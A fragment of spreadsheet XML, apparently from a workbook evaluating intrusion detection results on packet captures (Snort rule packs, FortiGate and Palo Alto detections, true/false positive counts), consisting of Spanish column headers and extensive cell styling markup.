    <t>#FLUJOS CON ATAQUE/S COLATERAL/ES</t>
  </si>
  <si>
    <t>#FLUJOS ATAQUE (TOTAL)</t>
  </si>
  <si>
    <t>#MENSAJES DE RED CON ATAQUE/S</t>
  </si>
  <si>
    <t>#INSTANCIAS ATAQUE TOTALES</t>
  </si>
  <si>
    <t>#INSTANCIAS ATAQUE PRINCIPALES</t>
  </si>
  <si>
    <t>#INSTANCIAS ATAQUES COLATERALES</t>
  </si>
  <si>
    <t>#Alertas</t>
  </si>
  <si>
    <t>#Alertas TP (Manual)</t>
  </si>
  <si>
    <t>#MENSAJES DE RED CON ATAQUE/S DETECTADOS</t>
  </si>
  <si>
    <t>#FLUJOS CON ATAQUE/S PRINCIPAL/ES TP  DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>#FLUJOS CON ATAQUE/S TP DETECTADOS (TOTAL)</t>
  </si>
  <si>
    <t>#MENSAJES DE RED CON ATAQUE/S TP DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>#Paquetes</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">#FLUJOS SNORTv3 </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="5"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>(=tranalyzer? y CSV?)</t>
    </r>
  </si>
  <si>
    <t>#FLUJOS CON ATAQUE/S COLATERAL/ES TP DETECTADOS (Manual)</t>
  </si>
  <si>
    <t>#FLUJOS CON ATAQUE/S DETECTADOS (con SID)</t>
  </si>
  <si>
    <t>#Instancias Ataque DETECTADAS</t>
  </si>
  <si>
    <t>#INSTANCIAS ATAQUE TP DETECTADAS (Manual)</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">El paquete de reglas "Talos Registered" contiene más reglas que el paquete "Talos Community". Su naturaleza es similar.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="10"/>
        <color theme="4"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Incluye a "Talos Community"</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Paquete de todas las reglas ofrecidas por Emerging Threats.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="10"/>
        <color theme="4"/>
        <rFont val="Arial"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>Incluye a "ETOpen"</t>
    </r>
  </si>
  <si>
    <t>#Alertas TP</t>
  </si>
  <si>
    <t>SIDs
(sin repetición)</t>
  </si>
  <si>
    <t>SIDs TP</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">#Flujos Snort </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="5"/>
        <rFont val="Arial"/>
        <family val="2"/>
      </rPr>
      <t>(=tranalyzer? y CSV?)</t>
    </r>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (con SID)</t>
  </si>
  <si>
    <t>#Flujos con Ataques Principales TP detectados</t>
  </si>
  <si>
    <t>#Flujos con Ataques Colaterales TP detectados</t>
  </si>
  <si>
    <t>#Flujos con Ataques TP detectados</t>
  </si>
  <si>
    <t>#Mensajes de red con ataque detectados</t>
  </si>
  <si>
    <t>#Mensajes de red con ataque TP detectados</t>
  </si>
  <si>
    <t>#Instancias Ataque detectadas TALOS</t>
  </si>
  <si>
    <t>#Instancias Ataque detectadas ETOpen</t>
  </si>
  <si>
    <t>#Instancias Ataque detectadas</t>
  </si>
  <si>
    <t>#Instancias Ataque TP detectadas</t>
  </si>
  <si>
    <t>#SID</t>
  </si>
  <si>
    <t>#SID TP (Manual)</t>
  </si>
  <si>
    <t>#SID TP</t>
  </si>
  <si>
    <t>Asociación Manual TP/FP de attackids</t>
  </si>
  <si>
    <t>#Attackids TP</t>
  </si>
  <si>
    <t>Incluir en Paper Snort</t>
  </si>
  <si>
    <t>Incluir en Paper Comerciales</t>
  </si>
  <si>
    <t>#Flujos FG</t>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (con attackid + appid)</t>
  </si>
  <si>
    <t>AppID (Control de Aplicaciones)</t>
  </si>
  <si>
    <t>#AppID</t>
  </si>
  <si>
    <t>Asociación Manual TP/FP de AppID</t>
  </si>
  <si>
    <t>AppID FP</t>
  </si>
  <si>
    <t>AppID TP</t>
  </si>
  <si>
    <t>#AppID TP</t>
  </si>
  <si>
    <t>Comentarios detecciones</t>
  </si>
  <si>
    <t>Attackids (sin repetición) - IPS</t>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (attackid)</t>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (AppID)</t>
  </si>
  <si>
    <t>FG</t>
  </si>
  <si>
    <t>PA</t>
  </si>
  <si>
    <t>threat_id (sin repetición) - IPS</t>
  </si>
  <si>
    <t>Asociación Manual TP/FP de threat_id</t>
  </si>
  <si>
    <t>#threat_id TP</t>
  </si>
  <si>
    <t>threat_id TP (Manual)</t>
  </si>
  <si>
    <t>threat_id FP</t>
  </si>
  <si>
    <t>#Flujos PA</t>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (con threatid + appid)</t>
  </si>
  <si>
    <t>#Flujos con Ataques detectados (threatid)</t>
  </si>
  <si>
    <t>MITRE</t>
  </si>
  <si>
    <t>pcap (Nuevo Nombre)</t>
  </si>
  <si>
    <t>pcapng</t>
  </si>
  <si>
    <t>#Flujos</t>
  </si>
  <si>
    <t>#IPs</t>
  </si>
  <si>
    <t>#Attack Alerts</t>
  </si>
  <si>
    <t>#Total Alerts</t>
  </si>
  <si>
    <t>SIDs</t>
  </si>
  <si>
    <t>#Attack Flows</t>
  </si>
  <si>
    <t>%FP</t>
  </si>
  <si>
    <t>%TN</t>
  </si>
  <si>
    <t>AttackIDs</t>
  </si>
  <si>
    <t>#AttackIDs</t>
  </si>
  <si>
    <t>AppIDs</t>
  </si>
  <si>
    <t>#AppIDs</t>
  </si>
  <si>
    <t>threatIDs</t>
  </si>
  <si>
    <t>#threatIDs</t>
  </si>
  <si>
    <t>CIC2018_DIAX.pcapng
(x=1, …, )</t>
  </si>
  <si>
    <t>T1505.003-Shell_Web_[2].pcapng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</si>
</sst>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6">
    <font>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF1F1F1F"/>
      <name val="&quot;Google Sans&quot;"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="14"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="14"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="14"/>
      <color theme="7"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF6AA84F"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="14"/>
      <color rgb="FF34A853"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF434343"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="14"/>
      <color rgb="FF57BB8A"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF1F1F1F"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="7"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF57BB8A"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="13"/>
      <color theme="1"/>
      <name val="Fugaz One"/>
    </font>
    <font>
      <sz val="14"/>
      <color theme="1"/>
      <name val="Fugaz One"/>
    </font>
    <font>
      <sz val="13"/>
      <color theme="1"/>
      <name val="Fugaz One"/>
    </font>
    <font>
      <strike/>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FFFFFFFF"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <u/>
      <sz val="10"/>
      <color rgb="FF0000FF"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <u/>
      <sz val="10"/>
      <color rgb="FF0000FF"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <u/>
      <sz val="10"/>
      <color rgb="FF0000FF"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="18"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="7"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF000000"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color rgb="FF000000"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="14"/>
      <color rgb="FF000000"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF6AA84F"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF57BB8A"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF34A853"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF434343"/>
      <name val="Arial, sans-serif"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FF6AA84F"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <u/>
      <sz val="10"/>
      <color rgb="FF1155CC"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF0070C0"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF0070C0"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF7030A0"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF7030A0"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="8" tint="-0.249977111117893"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="14"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="10"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF0070C0"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="7"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <i/>
      <u/>
      <sz val="10"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="10"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="15"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color rgb="FFFF0000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="11"/>
      <color theme="1"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color theme="5"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="14"/>
      <color theme="5"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="5"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="15"/>
      <color theme="4"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="10"/>
      <color theme="4"/>
      <name val="Arial"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="15"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FF00B050"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FFFF00FF"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FF00B050"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="11"/>
      <color rgb="FFFF3399"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <sz val="11"/>
      <color rgb="FFFF3399"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <i/>
      <sz val="15"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
    <font>
      <b/>
      <sz val="15"/>
      <color rgb="FF000000"/>
      <name val="Arial"/>
      <family val="2"/>
    </font>
  </fonts>
  <fills count="33">
    <fill>
      <patternFill patternType="none"/>
    </fill>
    <fill>
      <patternFill patternType="gray125"/>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4A86E8"/>
        <bgColor rgb="FF4A86E8"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFE6E6E6"/>
        <bgColor rgb="FFE6E6E6"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFDAF1F3"/>
        <bgColor rgb="FFDAF1F3"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFD9D9D9"/>
        <bgColor rgb="FFD9D9D9"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFB6D7A8"/>
        <bgColor rgb="FFB6D7A8"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FF9FC5E8"/>
        <bgColor rgb="FF9FC5E8"/>
      </patternFill>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
      <patternFill patternType="solid">
        <fgColor rgb="FFF3F3F3"/>
        <bgColor rgb="FFF3F3F3"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFF6D01"/>
        <bgColor rgb="FFFF6D01"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="6"/>
        <bgColor theme="6"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="0" tint="-0.14996795556505021"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="7" tint="0.79998168889431442"/>
        <bgColor rgb="FF9FC5E8"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="2" tint="-0.1499679555650502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34998626667073579"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="4"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="9" tint="0.79998168889431442"/>
        <bgColor rgb="FFB6D7A8"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="7" tint="0.59999389629810485"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor theme="8" tint="0.79998168889431442"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFAFE3B1"/>
        <bgColor rgb="FFE6E6E6"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFCDA7"/>
        <bgColor rgb="FFFF6D01"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFA25D"/>
        <bgColor rgb="FFFF6D01"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFF8225"/>
        <bgColor rgb="FFFF6D01"/>
      </patternFill>
    </fill>
    <fill>
      <patternFill patternType="solid">
        <fgColor rgb="FFFFFFCC"/>
        <bgColor indexed="64"/>
      </patternFill>
    </fill>
  </fills>
  <borders count="8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thick">
        <color rgb="FF000000"/>
      </left>
      <right style="thin">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ck">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right/>
      <top/>
      <bottom style="thin">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color rgb="FF000000"/>
      </left>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thick">
        <color rgb="FF000000"/>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ck">
        <color auto="1"/>
      </left>
      <right/>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color rgb="FF000000"/>
      </left>
      <right style="thick">
        <color rgb="FF000000"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thick">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ck">
        <color auto="1"/>
      </left>
      <right/>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="medium">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color auto="1"/>
      </left>
      <right style="thin">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="medium">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="thick">
        <color auto="1"/>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hair">
        <color rgb="FF000000"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right style="thick">
        <color rgb="FF000000"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="medium">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ck">
        <color rgb="FF000000"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left/>
      <right style="hair">
        <color rgb="FF000000"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>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rgb="FF000000"/>
      </left>
      <right style="hair">
        <color rgb="FF000000"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color rgb="FF000000"/>
      </left>
      <right style="hair">
        <color rgb="FF000000"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color rgb="FF000000"/>
      </left>
      <right style="hair">
        <color rgb="FF000000"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color auto="1"/>
      </left>
      <right style="hair">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color auto="1"/>
      </left>
      <right style="hair">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color auto="1"/>
      </left>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">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ck">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ck">
        <color auto="1"/>
      </right>
      <top style="thin">
        <color auto="1"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right/>
      <top style="medium">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right/>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom style="thin">
        <color rgb="FF000000"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color rgb="FF000000"/>
      </left>
      <right/>
      <top style="thin">
        <color rgb="FF000000"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color auto="1"/>
      </left>
      <right style="thick">
        <color auto="1"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thick">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ck">
        <color auto="1"/>
      </right>
      <top/>
      <bottom style="thin">
        <color auto="1"/>
      </bottom>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color auto="1"/>
      </left>
      <right style="thin">
        <color rgb="FF000000"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thick">
        <color auto="1"/>
      </left>
      <right style="hair">
        <color auto="1"/>
      </right>
      <top/>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="hair">
        <color auto="1"/>
      </left>
      <right/>
      <top style="thin">
        <color auto="1"/>
      </top>
      <bottom/>
      <diagonal/>
    </border>
    <border>
      <left style="thin">
        <color rgb="FF000000"/>
      </left>
      <right style="hair">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s>
  <cellStyleXfs count="3">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="28" fillId="0" borderId="0"/>
    <xf numFmtId="0" fontId="1" fillId="0" borderId="0"/>
  </cellStyleXfs>
  <cellXfs count="499">
    <xf numFmtId="0" fontId="0" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1"/>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14" fontId="6" fillId="0" borderId="2" xfId="0" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="2"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14" fontId="6" fillId="0" borderId="0" xfId="0" applyNumberFormat="1" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="2" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="4" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="5" borderId="11" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="3" borderId="0" xfId="0" applyFont="1" applyFill="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"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14" fontId="6" fillId="0" borderId="5" xfId="0" applyNumberFormat="1" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="2" borderId="5" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="3" borderId="5" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="5" fillId="4" borderId="5" xfId="0" applyFont="1" applyFill="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="7" fillId="5" borderId="6" xfId="0" applyFont="1" applyFill="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6" xfId="0" applyFont="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center"/>
    </xf>
    <xf numFmtId="0" fontId="7" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1"/>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
      <alignment horizontal="center"/>
    </xf>
    <xf numFmtId="0" fontId="6" fillId="0" borderId="0" xfId="0" applyFont="1"/>
    <xf numFmtId="0" fontId="10" fillId="7" borderId="14" xfId="0" applyFont="1" applyFill="1" applyBorder="1" applyAlignment="1">
      <alignment horizontal="center" vertical="center" wrapText="1"/>
    </xf>
    <xf numFmtId="0" fontId="10" fillId="0" borderId="0" xfId="0" applyFont="1" applyAlignment="1">
